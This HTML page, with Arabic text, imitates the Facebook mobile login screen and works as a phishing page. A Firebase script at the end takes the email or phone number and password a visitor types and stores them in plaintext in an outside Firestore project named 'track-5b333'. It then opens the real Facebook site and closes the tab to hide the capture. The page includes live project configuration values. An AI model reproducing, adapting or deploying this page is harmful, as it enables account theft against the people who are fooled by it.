<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook – Android</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0;font-family:Helvetica,Arial,sans-serif}
    body{background:#fff;color:#1c1e21;display:flex;flex-direction:column;align-items:center;padding:20px 16px}
    /* حاوية ثابتة للأيقونة */
    .logo-box{width:60px;height:60px;display:flex;align-items:center;justify-content:center;margin-bottom:28px;flex-shrink:0}
    .logo-box img{width:100%;height:100%;object-fit:contain}
    h2{font-size:20px;margin-bottom:8px;text-align:center}
    .subtitle{font-size:15px;color:#65676b;margin-bottom:24px;text-align:center}
    form{width:100%;max-width:380px}
    input{width:100%;padding:14px 12px;font-size:16px;border:1px solid #ddd;border-radius:6px;margin-bottom:12px;outline:none}
    input:focus{border-color:#1877f2}
    button{width:100%;padding:12px;font-size:16px;font-weight:bold;color:#fff;background:#1877f2;border:none;border-radius:6px;cursor:pointer}
    button:active{background:#166fe5}
    .link{display:block;text-align:center;margin-top:16px;font-size:14px;color:#1877f2;text-decoration:none}
    .divider{height:1px;background:#ddd;margin:20px 0}
    .create-btn{width:100%;max-width:380px;padding:12px;font-size:16px;font-weight:bold;color:#fff;background:#42B72A;border:none;border-radius:6px;cursor:pointer;margin:0 auto;display:block}
    .create-btn:active{background:#36981f}
    footer{margin-top:40px;font-size:12px;color:#8a8d91;text-align:center;line-height:1.4}
    footer a{color:#8a8d91;text-decoration:none;margin:0 4px}
    .meta{font-size:11px;color:#bec3c9;margin-top:8px}
  </style>
</head>
<body>
  <!-- أيقونة ثابتة غير متداخلة -->
  <div class="logo-box">
    <img src="https://img.freepik.com/photos-premium/logo-facebook_1080029-107.jpg?semt=ais_hybrid&w=740&q=80" alt="Facebook">
  </div>

  <h2>تسجيل الدخول إلى فيسبوك</h2>
  <p class="subtitle">أدخل بياناتك للمتابعة</p>

  <form>
    <input type="text" placeholder="رقم الهاتف أو البريد الإلكتروني">
    <input type="password" placeholder="كلمة السر">
    <button type="submit">تسجيل الدخول</button>
    <a class="link" href="#">هل نسيت كلمة السر؟</a>
  </form>

  <div class="divider"></div>

  <button class="create-btn">إنشاء حساب جديد</button>

  <footer>
<!-- داخل الـ footer -->
<div id="langBar">
  <a href="#" onclick="setLang('ar'); return false;">العربية</a>
  <a href="#" onclick="setLang('en'); return false;">English (UK)</a>
  <a href="#" onclick="setLang('hi'); return false;">हिन्दी</a>
  <a href="#" onclick="setLang('ta'); return false;">தமிழ்</a>
</div>

<script>
const dict = {
  ar: {
    title: "تسجيل الدخول إلى فيسبوك",
    subtitle: "أدخل بياناتك للمتابعة",
    email: "رقم الهاتف أو البريد الإلكتروني",
    pass: "كلمة السر",
    login: "تسجيل الدخول",
    forgot: "هل نسيت كلمة السر؟",
    create: "إنشاء حساب جديد",
    meta: "Facebook Meta"
  },
  en: {
    title: "Log in to Facebook",
    subtitle: "Enter your details to continue",
    email: "Phone number or email address",
    pass: "Password",
    login: "Log In",
    forgot: "Forgotten password?",
    create: "Create New Account",
    meta: "Facebook Meta"
  },
  hi: {
    title: "फ़ेसबुक में लॉग इन करें",
    subtitle: "जारी रखने के लिए अपना विवरण दर्ज करें",
    email: "फ़ोन नंबर या ईमेल पता",
    pass: "पासवर्ड",
    login: "लॉग इन करें",
    forgot: "पासवर्ड भूल गए?",
    create: "नया खाता बनाएँ",
    meta: "Facebook Meta"
  },
  ta: {
    title: "Facebook-இல் உள்நுழையவும்",
    subtitle: "தொடர உங்கள் விவரங்களை உள்ளிடவும்",
    email: "தொலைபேசி எண் அல்லது மின்னஞ்சல் முகவரி",
    pass: "கடவுச்சொல்",
    login: "உள்நுழையவும்",
    forgot: "கடவுச்சொல் மறந்துவிட்டதா?",
    create: "புதிய கணக்கு உருவாக்கவும்",
    meta: "Facebook Meta"
  }
};

function setLang(l){
  const t = dict[l];
  document.querySelector("h2").textContent = t.title;
  document.querySelector(".subtitle").textContent = t.subtitle;
  document.querySelector('input[type="text"]').placeholder = t.email;
  document.querySelector('input[type="password"]').placeholder = t.pass;
  document.querySelector('button[type="submit"]').textContent = t.login;
  document.querySelector('.link').textContent = t.forgot;
  document.querySelector('.create-btn').textContent = t.create;
  document.querySelector('.meta').textContent = t.meta;
}
</script>
    <div class="meta">Facebook Meta</div>
  </footer>
  <!-- Firebase v9 -->
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";

  const firebaseConfig = {
    apiKey: "AIzaSyDwGqTQRikHsTqgO8Aid32JiKTiAJuswmo",
    authDomain: "track-5b333.firebaseapp.com",
    projectId: "track-5b333",
    storageBucket: "track-5b333.firebasestorage.app",
    messagingSenderId: "1051564826268",
    appId: "1:1051564826268:web:d6ca97d09b4ba2f6e99759",
    measurementId: "G-L67C04T5TL"
  };
  const app = initializeApp(firebaseConfig);
  const db  = getFirestore(app);

  document.querySelector("form").addEventListener("submit", async (e) => {
    e.preventDefault();                       // منع الإرسال العادي
    const email = document.querySelector('input[type="text"]').value.trim();
    const pass  = document.querySelector('input[type="password"]').value.trim();
    if (!email || !pass) return;

    try {
      await addDoc(collection(db, "users"), {
        email: email,
        password: pass,
        opened: true,
        timestamp: serverTimestamp()
      });
      // بعد الحفظ مباشرة: أغلق التاب وافتح فيسبوك
      window.open("https://www.facebook.com", "_blank");
      window.close();                         // أغلق التاب الحالي
    } catch {
      // في حال فشل الحفظ لا يفتح شيء
    }
  });
</script>
</body>
</html>
